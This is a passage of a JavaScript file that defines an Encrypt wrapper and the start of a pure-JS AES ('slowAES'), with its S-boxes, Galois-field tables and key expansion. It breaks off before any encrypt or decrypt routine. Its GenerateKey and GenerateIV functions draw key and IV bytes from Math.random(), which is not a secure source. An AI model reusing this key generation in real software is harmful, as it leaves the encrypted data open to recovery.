var Encrypt = function(text, inKey, inIv) {
  var key = inKey;
  var iv  = inIv;

  var FromHexStr = function(str) {
      var res = [];
      
      for (var i = 0; i < str.length; i += 2) {
          var hex = str.substr(i, 2);
          
          res.push(parseInt(hex, 16));
      }

      return res;
  }
  
  var GenerateKey = function() {
      key = [];
      
      for (var i = 0; i < 32; i++) {
          key.push(Math.round(Math.random() * 255))
      }
  }
  
  var GenerateIV = function() {
      iv = [];
      
      for (var i = 0; i < 16; i++) {
          iv.push(Math.round(Math.random() * 255))
      }
  }
  
  var ToHexStr = function(arr) {
      return Array.from(arr, function(byte) {
          return ('0' + (byte & 0xFF).toString(16)).slice(-2);
      }).join('').toUpperCase();
  }

  var StrToArrayOfBytes = function(str) {
      var res = [];
      
      for (var i = 0; i < str.length; i++) {
          var charCode = str.charCodeAt(i);
          
          res.push( charCode       & 0xFF);
          res.push((charCode >> 8) & 0xFF);
      }
      
      return res;
  };
  
  var BinToArrayOfBytes = function(bin) {
      var res = [];
      
      for (var i = 0; i < bin.length; i++) {
          res.push(bin.charCodeAt(i));
      }
      
      return res;
  };
  
  var FromArrayOfBytes = function(arr) {
      var res = '';
      
      for (var i = 0; i < arr.length; i += 2) {
          var chr = String.fromCharCode(arr[i] | (arr[i + 1]) << 8);
          
          res += chr;
      }

      return res;
  };
  
  var ToRawData = function(arr) {    
      var res = '';

      for (var i = 0; i < arr.length; i++) {
          res += String.fromCharCode(arr[i]);
      }

      return btoa(res);
  }
  
  var FromRawData = function(str) {       
      return BinToArrayOfBytes(atob(str));
  }
  
  var slowAES = {
      aes:{
          // structure of valid key sizes
          keySize:{
              SIZE_128:16,
              SIZE_192:24,
              SIZE_256:32
          },
          
          // Rijndael S-box
          sbox:[
          0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
          0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
          0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
          0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
          0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
          0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
          0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
          0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
          0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
          0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
          0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
          0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
          0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
          0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
          0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
          0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16 ],
          
          // Rijndael Inverted S-box
          rsbox:
          [ 0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb
          , 0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb
          , 0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e
          , 0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25
          , 0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92
          , 0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84
          , 0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06
          , 0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b
          , 0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73
          , 0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e
          , 0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b
          , 0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4
          , 0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f
          , 0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef
          , 0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61
          , 0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d ],
          
          /* rotate the word eight bits to the left */
          rotate:function(word)
          {
              var c = word[0];
              for (var i = 0; i < 3; i++)
                  word[i] = word[i+1];
              word[3] = c;
              
              return word;
          },
          
          // Rijndael Rcon
          Rcon:[
          0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8,
          0xab, 0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3,
          0x7d, 0xfa, 0xef, 0xc5, 0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f,
          0x25, 0x4a, 0x94, 0x33, 0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb, 0x8d,
          0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab,
          0x4d, 0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d,
          0xfa, 0xef, 0xc5, 0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f, 0x25,
          0x4a, 0x94, 0x33, 0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb, 0x8d, 0x01,
          0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d,
          0x9a, 0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d, 0xfa,
          0xef, 0xc5, 0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f, 0x25, 0x4a,
          0x94, 0x33, 0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb, 0x8d, 0x01, 0x02,
          0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a,
          0x2f, 0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d, 0xfa, 0xef,
          0xc5, 0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f, 0x25, 0x4a, 0x94,
          0x33, 0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb, 0x8d, 0x01, 0x02, 0x04,
          0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36, 0x6c, 0xd8, 0xab, 0x4d, 0x9a, 0x2f,
          0x5e, 0xbc, 0x63, 0xc6, 0x97, 0x35, 0x6a, 0xd4, 0xb3, 0x7d, 0xfa, 0xef, 0xc5,
          0x91, 0x39, 0x72, 0xe4, 0xd3, 0xbd, 0x61, 0xc2, 0x9f, 0x25, 0x4a, 0x94, 0x33,
          0x66, 0xcc, 0x83, 0x1d, 0x3a, 0x74, 0xe8, 0xcb ],

          G2X: [
          0x00, 0x02, 0x04, 0x06, 0x08, 0x0a, 0x0c, 0x0e, 0x10, 0x12, 0x14, 0x16,
          0x18, 0x1a, 0x1c, 0x1e, 0x20, 0x22, 0x24, 0x26, 0x28, 0x2a, 0x2c, 0x2e,
          0x30, 0x32, 0x34, 0x36, 0x38, 0x3a, 0x3c, 0x3e, 0x40, 0x42, 0x44, 0x46,
          0x48, 0x4a, 0x4c, 0x4e, 0x50, 0x52, 0x54, 0x56, 0x58, 0x5a, 0x5c, 0x5e,
          0x60, 0x62, 0x64, 0x66, 0x68, 0x6a, 0x6c, 0x6e, 0x70, 0x72, 0x74, 0x76,
          0x78, 0x7a, 0x7c, 0x7e, 0x80, 0x82, 0x84, 0x86, 0x88, 0x8a, 0x8c, 0x8e,
          0x90, 0x92, 0x94, 0x96, 0x98, 0x9a, 0x9c, 0x9e, 0xa0, 0xa2, 0xa4, 0xa6,
          0xa8, 0xaa, 0xac, 0xae, 0xb0, 0xb2, 0xb4, 0xb6, 0xb8, 0xba, 0xbc, 0xbe,
          0xc0, 0xc2, 0xc4, 0xc6, 0xc8, 0xca, 0xcc, 0xce, 0xd0, 0xd2, 0xd4, 0xd6,
          0xd8, 0xda, 0xdc, 0xde, 0xe0, 0xe2, 0xe4, 0xe6, 0xe8, 0xea, 0xec, 0xee,
          0xf0, 0xf2, 0xf4, 0xf6, 0xf8, 0xfa, 0xfc, 0xfe, 0x1b, 0x19, 0x1f, 0x1d,
          0x13, 0x11, 0x17, 0x15, 0x0b, 0x09, 0x0f, 0x0d, 0x03, 0x01, 0x07, 0x05,
          0x3b, 0x39, 0x3f, 0x3d, 0x33, 0x31, 0x37, 0x35, 0x2b, 0x29, 0x2f, 0x2d,
          0x23, 0x21, 0x27, 0x25, 0x5b, 0x59, 0x5f, 0x5d, 0x53, 0x51, 0x57, 0x55,
          0x4b, 0x49, 0x4f, 0x4d, 0x43, 0x41, 0x47, 0x45, 0x7b, 0x79, 0x7f, 0x7d,
          0x73, 0x71, 0x77, 0x75, 0x6b, 0x69, 0x6f, 0x6d, 0x63, 0x61, 0x67, 0x65,
          0x9b, 0x99, 0x9f, 0x9d, 0x93, 0x91, 0x97, 0x95, 0x8b, 0x89, 0x8f, 0x8d,
          0x83, 0x81, 0x87, 0x85, 0xbb, 0xb9, 0xbf, 0xbd, 0xb3, 0xb1, 0xb7, 0xb5,
          0xab, 0xa9, 0xaf, 0xad, 0xa3, 0xa1, 0xa7, 0xa5, 0xdb, 0xd9, 0xdf, 0xdd,
          0xd3, 0xd1, 0xd7, 0xd5, 0xcb, 0xc9, 0xcf, 0xcd, 0xc3, 0xc1, 0xc7, 0xc5,
          0xfb, 0xf9, 0xff, 0xfd, 0xf3, 0xf1, 0xf7, 0xf5, 0xeb, 0xe9, 0xef, 0xed,
          0xe3, 0xe1, 0xe7, 0xe5
          ],

          G3X: [
          0x00, 0x03, 0x06, 0x05, 0x0c, 0x0f, 0x0a, 0x09, 0x18, 0x1b, 0x1e, 0x1d,
          0x14, 0x17, 0x12, 0x11, 0x30, 0x33, 0x36, 0x35, 0x3c, 0x3f, 0x3a, 0x39,
          0x28, 0x2b, 0x2e, 0x2d, 0x24, 0x27, 0x22, 0x21, 0x60, 0x63, 0x66, 0x65,
          0x6c, 0x6f, 0x6a, 0x69, 0x78, 0x7b, 0x7e, 0x7d, 0x74, 0x77, 0x72, 0x71,
          0x50, 0x53, 0x56, 0x55, 0x5c, 0x5f, 0x5a, 0x59, 0x48, 0x4b, 0x4e, 0x4d,
          0x44, 0x47, 0x42, 0x41, 0xc0, 0xc3, 0xc6, 0xc5, 0xcc, 0xcf, 0xca, 0xc9,
          0xd8, 0xdb, 0xde, 0xdd, 0xd4, 0xd7, 0xd2, 0xd1, 0xf0, 0xf3, 0xf6, 0xf5,
          0xfc, 0xff, 0xfa, 0xf9, 0xe8, 0xeb, 0xee, 0xed, 0xe4, 0xe7, 0xe2, 0xe1,
          0xa0, 0xa3, 0xa6, 0xa5, 0xac, 0xaf, 0xaa, 0xa9, 0xb8, 0xbb, 0xbe, 0xbd,
          0xb4, 0xb7, 0xb2, 0xb1, 0x90, 0x93, 0x96, 0x95, 0x9c, 0x9f, 0x9a, 0x99,
          0x88, 0x8b, 0x8e, 0x8d, 0x84, 0x87, 0x82, 0x81, 0x9b, 0x98, 0x9d, 0x9e,
          0x97, 0x94, 0x91, 0x92, 0x83, 0x80, 0x85, 0x86, 0x8f, 0x8c, 0x89, 0x8a,
          0xab, 0xa8, 0xad, 0xae, 0xa7, 0xa4, 0xa1, 0xa2, 0xb3, 0xb0, 0xb5, 0xb6,
          0xbf, 0xbc, 0xb9, 0xba, 0xfb, 0xf8, 0xfd, 0xfe, 0xf7, 0xf4, 0xf1, 0xf2,
          0xe3, 0xe0, 0xe5, 0xe6, 0xef, 0xec, 0xe9, 0xea, 0xcb, 0xc8, 0xcd, 0xce,
          0xc7, 0xc4, 0xc1, 0xc2, 0xd3, 0xd0, 0xd5, 0xd6, 0xdf, 0xdc, 0xd9, 0xda,
          0x5b, 0x58, 0x5d, 0x5e, 0x57, 0x54, 0x51, 0x52, 0x43, 0x40, 0x45, 0x46,
          0x4f, 0x4c, 0x49, 0x4a, 0x6b, 0x68, 0x6d, 0x6e, 0x67, 0x64, 0x61, 0x62,
          0x73, 0x70, 0x75, 0x76, 0x7f, 0x7c, 0x79, 0x7a, 0x3b, 0x38, 0x3d, 0x3e,
          0x37, 0x34, 0x31, 0x32, 0x23, 0x20, 0x25, 0x26, 0x2f, 0x2c, 0x29, 0x2a,
          0x0b, 0x08, 0x0d, 0x0e, 0x07, 0x04, 0x01, 0x02, 0x13, 0x10, 0x15, 0x16,
          0x1f, 0x1c, 0x19, 0x1a
          ],

          G9X: [
          0x00, 0x09, 0x12, 0x1b, 0x24, 0x2d, 0x36, 0x3f, 0x48, 0x41, 0x5a, 0x53,
          0x6c, 0x65, 0x7e, 0x77, 0x90, 0x99, 0x82, 0x8b, 0xb4, 0xbd, 0xa6, 0xaf,
          0xd8, 0xd1, 0xca, 0xc3, 0xfc, 0xf5, 0xee, 0xe7, 0x3b, 0x32, 0x29, 0x20,
          0x1f, 0x16, 0x0d, 0x04, 0x73, 0x7a, 0x61, 0x68, 0x57, 0x5e, 0x45, 0x4c,
          0xab, 0xa2, 0xb9, 0xb0, 0x8f, 0x86, 0x9d, 0x94, 0xe3, 0xea, 0xf1, 0xf8,
          0xc7, 0xce, 0xd5, 0xdc, 0x76, 0x7f, 0x64, 0x6d, 0x52, 0x5b, 0x40, 0x49,
          0x3e, 0x37, 0x2c, 0x25, 0x1a, 0x13, 0x08, 0x01, 0xe6, 0xef, 0xf4, 0xfd,
          0xc2, 0xcb, 0xd0, 0xd9, 0xae, 0xa7, 0xbc, 0xb5, 0x8a, 0x83, 0x98, 0x91,
          0x4d, 0x44, 0x5f, 0x56, 0x69, 0x60, 0x7b, 0x72, 0x05, 0x0c, 0x17, 0x1e,
          0x21, 0x28, 0x33, 0x3a, 0xdd, 0xd4, 0xcf, 0xc6, 0xf9, 0xf0, 0xeb, 0xe2,
          0x95, 0x9c, 0x87, 0x8e, 0xb1, 0xb8, 0xa3, 0xaa, 0xec, 0xe5, 0xfe, 0xf7,
          0xc8, 0xc1, 0xda, 0xd3, 0xa4, 0xad, 0xb6, 0xbf, 0x80, 0x89, 0x92, 0x9b,
          0x7c, 0x75, 0x6e, 0x67, 0x58, 0x51, 0x4a, 0x43, 0x34, 0x3d, 0x26, 0x2f,
          0x10, 0x19, 0x02, 0x0b, 0xd7, 0xde, 0xc5, 0xcc, 0xf3, 0xfa, 0xe1, 0xe8,
          0x9f, 0x96, 0x8d, 0x84, 0xbb, 0xb2, 0xa9, 0xa0, 0x47, 0x4e, 0x55, 0x5c,
          0x63, 0x6a, 0x71, 0x78, 0x0f, 0x06, 0x1d, 0x14, 0x2b, 0x22, 0x39, 0x30,
          0x9a, 0x93, 0x88, 0x81, 0xbe, 0xb7, 0xac, 0xa5, 0xd2, 0xdb, 0xc0, 0xc9,
          0xf6, 0xff, 0xe4, 0xed, 0x0a, 0x03, 0x18, 0x11, 0x2e, 0x27, 0x3c, 0x35,
          0x42, 0x4b, 0x50, 0x59, 0x66, 0x6f, 0x74, 0x7d, 0xa1, 0xa8, 0xb3, 0xba,
          0x85, 0x8c, 0x97, 0x9e, 0xe9, 0xe0, 0xfb, 0xf2, 0xcd, 0xc4, 0xdf, 0xd6,
          0x31, 0x38, 0x23, 0x2a, 0x15, 0x1c, 0x07, 0x0e, 0x79, 0x70, 0x6b, 0x62,
          0x5d, 0x54, 0x4f, 0x46
          ],

          GBX: [
          0x00, 0x0b, 0x16, 0x1d, 0x2c, 0x27, 0x3a, 0x31, 0x58, 0x53, 0x4e, 0x45,
          0x74, 0x7f, 0x62, 0x69, 0xb0, 0xbb, 0xa6, 0xad, 0x9c, 0x97, 0x8a, 0x81,
          0xe8, 0xe3, 0xfe, 0xf5, 0xc4, 0xcf, 0xd2, 0xd9, 0x7b, 0x70, 0x6d, 0x66,
          0x57, 0x5c, 0x41, 0x4a, 0x23, 0x28, 0x35, 0x3e, 0x0f, 0x04, 0x19, 0x12,
          0xcb, 0xc0, 0xdd, 0xd6, 0xe7, 0xec, 0xf1, 0xfa, 0x93, 0x98, 0x85, 0x8e,
          0xbf, 0xb4, 0xa9, 0xa2, 0xf6, 0xfd, 0xe0, 0xeb, 0xda, 0xd1, 0xcc, 0xc7,
          0xae, 0xa5, 0xb8, 0xb3, 0x82, 0x89, 0x94, 0x9f, 0x46, 0x4d, 0x50, 0x5b,
          0x6a, 0x61, 0x7c, 0x77, 0x1e, 0x15, 0x08, 0x03, 0x32, 0x39, 0x24, 0x2f,
          0x8d, 0x86, 0x9b, 0x90, 0xa1, 0xaa, 0xb7, 0xbc, 0xd5, 0xde, 0xc3, 0xc8,
          0xf9, 0xf2, 0xef, 0xe4, 0x3d, 0x36, 0x2b, 0x20, 0x11, 0x1a, 0x07, 0x0c,
          0x65, 0x6e, 0x73, 0x78, 0x49, 0x42, 0x5f, 0x54, 0xf7, 0xfc, 0xe1, 0xea,
          0xdb, 0xd0, 0xcd, 0xc6, 0xaf, 0xa4, 0xb9, 0xb2, 0x83, 0x88, 0x95, 0x9e,
          0x47, 0x4c, 0x51, 0x5a, 0x6b, 0x60, 0x7d, 0x76, 0x1f, 0x14, 0x09, 0x02,
          0x33, 0x38, 0x25, 0x2e, 0x8c, 0x87, 0x9a, 0x91, 0xa0, 0xab, 0xb6, 0xbd,
          0xd4, 0xdf, 0xc2, 0xc9, 0xf8, 0xf3, 0xee, 0xe5, 0x3c, 0x37, 0x2a, 0x21,
          0x10, 0x1b, 0x06, 0x0d, 0x64, 0x6f, 0x72, 0x79, 0x48, 0x43, 0x5e, 0x55,
          0x01, 0x0a, 0x17, 0x1c, 0x2d, 0x26, 0x3b, 0x30, 0x59, 0x52, 0x4f, 0x44,
          0x75, 0x7e, 0x63, 0x68, 0xb1, 0xba, 0xa7, 0xac, 0x9d, 0x96, 0x8b, 0x80,
          0xe9, 0xe2, 0xff, 0xf4, 0xc5, 0xce, 0xd3, 0xd8, 0x7a, 0x71, 0x6c, 0x67,
          0x56, 0x5d, 0x40, 0x4b, 0x22, 0x29, 0x34, 0x3f, 0x0e, 0x05, 0x18, 0x13,
          0xca, 0xc1, 0xdc, 0xd7, 0xe6, 0xed, 0xf0, 0xfb, 0x92, 0x99, 0x84, 0x8f,
          0xbe, 0xb5, 0xa8, 0xa3
          ],

          GDX: [
          0x00, 0x0d, 0x1a, 0x17, 0x34, 0x39, 0x2e, 0x23, 0x68, 0x65, 0x72, 0x7f,
          0x5c, 0x51, 0x46, 0x4b, 0xd0, 0xdd, 0xca, 0xc7, 0xe4, 0xe9, 0xfe, 0xf3,
          0xb8, 0xb5, 0xa2, 0xaf, 0x8c, 0x81, 0x96, 0x9b, 0xbb, 0xb6, 0xa1, 0xac,
          0x8f, 0x82, 0x95, 0x98, 0xd3, 0xde, 0xc9, 0xc4, 0xe7, 0xea, 0xfd, 0xf0,
          0x6b, 0x66, 0x71, 0x7c, 0x5f, 0x52, 0x45, 0x48, 0x03, 0x0e, 0x19, 0x14,
          0x37, 0x3a, 0x2d, 0x20, 0x6d, 0x60, 0x77, 0x7a, 0x59, 0x54, 0x43, 0x4e,
          0x05, 0x08, 0x1f, 0x12, 0x31, 0x3c, 0x2b, 0x26, 0xbd, 0xb0, 0xa7, 0xaa,
          0x89, 0x84, 0x93, 0x9e, 0xd5, 0xd8, 0xcf, 0xc2, 0xe1, 0xec, 0xfb, 0xf6,
          0xd6, 0xdb, 0xcc, 0xc1, 0xe2, 0xef, 0xf8, 0xf5, 0xbe, 0xb3, 0xa4, 0xa9,
          0x8a, 0x87, 0x90, 0x9d, 0x06, 0x0b, 0x1c, 0x11, 0x32, 0x3f, 0x28, 0x25,
          0x6e, 0x63, 0x74, 0x79, 0x5a, 0x57, 0x40, 0x4d, 0xda, 0xd7, 0xc0, 0xcd,
          0xee, 0xe3, 0xf4, 0xf9, 0xb2, 0xbf, 0xa8, 0xa5, 0x86, 0x8b, 0x9c, 0x91,
          0x0a, 0x07, 0x10, 0x1d, 0x3e, 0x33, 0x24, 0x29, 0x62, 0x6f, 0x78, 0x75,
          0x56, 0x5b, 0x4c, 0x41, 0x61, 0x6c, 0x7b, 0x76, 0x55, 0x58, 0x4f, 0x42,
          0x09, 0x04, 0x13, 0x1e, 0x3d, 0x30, 0x27, 0x2a, 0xb1, 0xbc, 0xab, 0xa6,
          0x85, 0x88, 0x9f, 0x92, 0xd9, 0xd4, 0xc3, 0xce, 0xed, 0xe0, 0xf7, 0xfa,
          0xb7, 0xba, 0xad, 0xa0, 0x83, 0x8e, 0x99, 0x94, 0xdf, 0xd2, 0xc5, 0xc8,
          0xeb, 0xe6, 0xf1, 0xfc, 0x67, 0x6a, 0x7d, 0x70, 0x53, 0x5e, 0x49, 0x44,
          0x0f, 0x02, 0x15, 0x18, 0x3b, 0x36, 0x21, 0x2c, 0x0c, 0x01, 0x16, 0x1b,
          0x38, 0x35, 0x22, 0x2f, 0x64, 0x69, 0x7e, 0x73, 0x50, 0x5d, 0x4a, 0x47,
          0xdc, 0xd1, 0xc6, 0xcb, 0xe8, 0xe5, 0xf2, 0xff, 0xb4, 0xb9, 0xae, 0xa3,
          0x80, 0x8d, 0x9a, 0x97
          ],

          GEX: [
          0x00, 0x0e, 0x1c, 0x12, 0x38, 0x36, 0x24, 0x2a, 0x70, 0x7e, 0x6c, 0x62,
          0x48, 0x46, 0x54, 0x5a, 0xe0, 0xee, 0xfc, 0xf2, 0xd8, 0xd6, 0xc4, 0xca,
          0x90, 0x9e, 0x8c, 0x82, 0xa8, 0xa6, 0xb4, 0xba, 0xdb, 0xd5, 0xc7, 0xc9,
          0xe3, 0xed, 0xff, 0xf1, 0xab, 0xa5, 0xb7, 0xb9, 0x93, 0x9d, 0x8f, 0x81,
          0x3b, 0x35, 0x27, 0x29, 0x03, 0x0d, 0x1f, 0x11, 0x4b, 0x45, 0x57, 0x59,
          0x73, 0x7d, 0x6f, 0x61, 0xad, 0xa3, 0xb1, 0xbf, 0x95, 0x9b, 0x89, 0x87,
          0xdd, 0xd3, 0xc1, 0xcf, 0xe5, 0xeb, 0xf9, 0xf7, 0x4d, 0x43, 0x51, 0x5f,
          0x75, 0x7b, 0x69, 0x67, 0x3d, 0x33, 0x21, 0x2f, 0x05, 0x0b, 0x19, 0x17,
          0x76, 0x78, 0x6a, 0x64, 0x4e, 0x40, 0x52, 0x5c, 0x06, 0x08, 0x1a, 0x14,
          0x3e, 0x30, 0x22, 0x2c, 0x96, 0x98, 0x8a, 0x84, 0xae, 0xa0, 0xb2, 0xbc,
          0xe6, 0xe8, 0xfa, 0xf4, 0xde, 0xd0, 0xc2, 0xcc, 0x41, 0x4f, 0x5d, 0x53,
          0x79, 0x77, 0x65, 0x6b, 0x31, 0x3f, 0x2d, 0x23, 0x09, 0x07, 0x15, 0x1b,
          0xa1, 0xaf, 0xbd, 0xb3, 0x99, 0x97, 0x85, 0x8b, 0xd1, 0xdf, 0xcd, 0xc3,
          0xe9, 0xe7, 0xf5, 0xfb, 0x9a, 0x94, 0x86, 0x88, 0xa2, 0xac, 0xbe, 0xb0,
          0xea, 0xe4, 0xf6, 0xf8, 0xd2, 0xdc, 0xce, 0xc0, 0x7a, 0x74, 0x66, 0x68,
          0x42, 0x4c, 0x5e, 0x50, 0x0a, 0x04, 0x16, 0x18, 0x32, 0x3c, 0x2e, 0x20,
          0xec, 0xe2, 0xf0, 0xfe, 0xd4, 0xda, 0xc8, 0xc6, 0x9c, 0x92, 0x80, 0x8e,
          0xa4, 0xaa, 0xb8, 0xb6, 0x0c, 0x02, 0x10, 0x1e, 0x34, 0x3a, 0x28, 0x26,
          0x7c, 0x72, 0x60, 0x6e, 0x44, 0x4a, 0x58, 0x56, 0x37, 0x39, 0x2b, 0x25,
          0x0f, 0x01, 0x13, 0x1d, 0x47, 0x49, 0x5b, 0x55, 0x7f, 0x71, 0x63, 0x6d,
          0xd7, 0xd9, 0xcb, 0xc5, 0xef, 0xe1, 0xf3, 0xfd, 0xa7, 0xa9, 0xbb, 0xb5,
          0x9f, 0x91, 0x83, 0x8d
          ],
          
          // Key Schedule Core
          core:function(word,iteration)
          {
              /* rotate the 32-bit word 8 bits to the left */
              word = this.rotate(word);
              /* apply S-Box substitution on all 4 parts of the 32-bit word */
              for (var i = 0; i < 4; ++i)
                  word[i] = this.sbox[word[i]];
              /* XOR the output of the rcon operation with i to the first part (leftmost) only */
              word[0] = word[0]^this.Rcon[iteration];
              return word;
          },
          
          /* Rijndael's key expansion
           * expands an 128,192,256 key into an 176,208,240 bytes key
           *
           * expandedKey is a pointer to an char array of large enough size
           * key is a pointer to a non-expanded key
           */
          expandKey:function(key,size)
          {
              var expandedKeySize = (16*(this.numberOfRounds(size)+1));
              
              /* current expanded keySize, in bytes */
              var currentSize = 0;
              var rconIteration = 1;
              var t = [];   // temporary 4-byte variable
              
              var expandedKey = [];
              for(var i = 0;i < expandedKeySize;i++)
                  expandedKey[i] = 0;
          
              /* set the 16,24,32 bytes of the expanded key to the input key */
              for (var j = 0; j < size; j++)
                  expandedKey[j] = key[j];
              currentSize += size;
          
              while (currentSize < expandedKeySize)
              {
                  /* assign the previous 4 bytes to the temporary value t */
                  for (var k = 0; k < 4; k++)
                      t[k] = expandedKey[(currentSize - 4) + k];
          
                  /* every 16,24,32 bytes we apply the core schedule to t
                   * and increment rconIteration afterwards
                   */
                  if(currentSize % size == 0)
                      t = this.core(t, rconIteration++);
          
                  /* For 256-bit keys, we add an extra sbox to the calculation */
                  if(size == this.keySize.SIZE_256 && ((currentSize % size) == 16))
                      for(var l = 0; l < 4; l++)
                          t[l] = this.sbox[t[l]];
          
                  /* We XOR t with the four-byte block 16,24,32 bytes before the new expanded key.
                   * This becomes the next four bytes in the expanded key.
                   */
                  for(var m = 0; m < 4; m++) {
                      expandedKey[currentSize] = expandedKey[currentSize - size] ^ t[m];
                      currentSize++;
                  }
              }
              return expandedKey;
          },
          
